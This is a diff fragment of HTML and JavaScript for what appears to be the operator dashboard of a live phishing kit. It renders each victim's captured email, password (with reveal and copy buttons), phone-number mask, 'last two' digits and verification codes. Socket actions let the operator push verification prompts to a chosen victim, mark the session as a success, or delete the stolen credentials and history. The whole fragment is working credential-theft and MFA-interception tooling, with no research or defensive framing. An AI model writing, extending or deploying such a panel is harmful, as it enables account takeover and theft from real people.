+          (s.credentials && s.credentials.email) || s.email || '—'
+        rows.push(
+          `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Email</span><span class="mono text-slate-100 truncate">${escapeHtml(emailVal)}</span></div>`,
+        )
+        if (isOutlook && s.pendingData && s.pendingData.phone) {
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Mask</span><span class="mono text-slate-100">********${escapeHtml(s.pendingData.phone)}</span></div>`,
+          )
+        }
+        if (hasCreds) {
+          const pw = s.credentials.password || ''
+          const masked = pw.length ? '•'.repeat(Math.min(pw.length, 24)) : '—'
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Password</span><span class="mono text-slate-100 truncate" data-pw="${escapeHtml(pw)}" data-visible="false">${escapeHtml(masked)}</span><button data-act="reveal" class="ml-1 text-[10px] bg-slate-800 hover:bg-slate-700 rounded px-2 py-0.5 text-slate-200">reveal</button><button data-act="copy" data-copy="${escapeHtml(pw)}" class="text-[10px] bg-slate-800 hover:bg-slate-700 rounded px-2 py-0.5 text-slate-200">copy</button></div>`,
+          )
+        } else {
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Password</span><span class="text-slate-500 italic">waiting…</span></div>`,
+          )
+        }
+        if (usesVerify) {
+          const lastTwo =
+            (s.pendingData && s.pendingData.lastTwo) ||
+            (s.credentials && s.credentials.lastTwo) ||
+            ''
+          const answer =
+            (s.userAnswer && s.userAnswer.digits) ||
+            (s.credentials && s.credentials.answer) ||
+            ''
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Last 2</span>${lastTwo ? `<span class="mono text-slate-100">${escapeHtml(lastTwo)}</span>` : dash}</div>`,
+          )
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">${isOutlook ? 'User digits' : 'Answer'}</span>${answer ? `<span class="mono text-slate-100">${escapeHtml(answer)}</span>` : dash}</div>`,
+          )
+        }
+        if (usesCode) {
+          const code = (s.verificationCode && s.verificationCode.digits) || ''
+          rows.push(
+            `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Code</span>${code ? `<span class="mono text-slate-100">${escapeHtml(code)}</span>` : dash}</div>`,
+          )
+        }
+        wrap.className =
+          'bg-emerald-950/40 border border-emerald-800 rounded-md p-3 text-xs'
+        wrap.innerHTML = `
+          <div class="flex items-center justify-between mb-2">
+            <span class="font-semibold text-emerald-300">Captured values</span>
+            <span class="text-[10px] text-slate-400">${fmtTime(s.credentials && s.credentials.submittedAt)}</span>
+          </div>
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">${rows.join('')}</div>`
+        wrap
+          .querySelector('[data-act="reveal"]')
+          ?.addEventListener('click', (e) => {
+            const span = wrap.querySelector('[data-pw]')
+            const btn = e.currentTarget
+            const visible = span.dataset.visible === 'true'
+            const pw = span.dataset.pw || ''
+            const masked = pw.length ? '•'.repeat(Math.min(pw.length, 24)) : '—'
+            span.textContent = visible ? masked : pw
+            span.dataset.visible = visible ? 'false' : 'true'
+            btn.textContent = visible ? 'reveal' : 'hide'
+          })
+        wrap
+          .querySelector('[data-act="copy"]')
+          ?.addEventListener('click', (e) => {
+            const val = e.currentTarget.dataset.copy || ''
+            navigator.clipboard?.writeText(val).then(() => {
+              const btn = e.currentTarget
+              const orig = btn.textContent
+              btn.textContent = 'copied'
+              setTimeout(() => (btn.textContent = orig), 1200)
+            })
+          })
+        return wrap
+      }
+
+      /* ============================================================
+       * PER-SESSION ACTIONS
+       * ============================================================ */
+      sessionsEl.addEventListener('click', (e) => {
+        const btn = e.target.closest('button[data-act]')
+        if (!btn) return
+        const act = btn.dataset.act
+        if (act === 'reveal' || act === 'copy') return
+        const id = btn.dataset.id
+        if (act === 'send') {
+          socket.emit('admin_send_verify', {
+            targetSocketId: id,
+            ...readPayload(),
+          })
+          log(`sent verify → ${id}`)
+        } else if (act === 'success') {
+          socket.emit('admin_send_success', { targetSocketId: id })
+          log(`success → ${id}`)
+        } else if (act === 'delete') {
+          const session = lastSessions.find((x) => x.id === id)
+          const who = session?.email || id
+          if (
+            !confirm(
+              `Delete the session for "${who}"?\n\nThis is permanent — the credentials and history will be gone.`,
+            )
+          )
+            return
+          socket.emit('admin_delete_session', { targetSocketId: id })
+          log(`deleted session → ${id}`)
+        }
+      })
+    </script>
+  </body>
+</html>
